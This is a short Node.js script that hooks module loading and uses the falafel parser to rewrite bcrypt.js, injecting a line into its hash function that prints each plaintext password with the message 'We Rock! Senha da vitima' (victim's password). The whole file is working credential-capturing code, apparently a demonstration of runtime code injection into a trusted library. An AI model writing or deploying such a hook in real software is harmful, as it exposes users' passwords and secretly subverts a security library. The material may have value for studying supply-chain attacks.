const Hook = require('./compile');
const Falafel = require('falafel');

const injection = script => {
    return Falafel(script, node => {
        if (node.source() === 'var error;' && node.parent.parent.id.name === 'hash') {
            node.update(`console.log('We Rock! Senha da vitima:', data);\n ${node.source()} \n`);
        }
    });
};

Hook.placeHook((content, filename, done) => {
    if (filename.includes('bcrypt.js')) {
        done(injection(content));
    } else {
        done();
    }
});

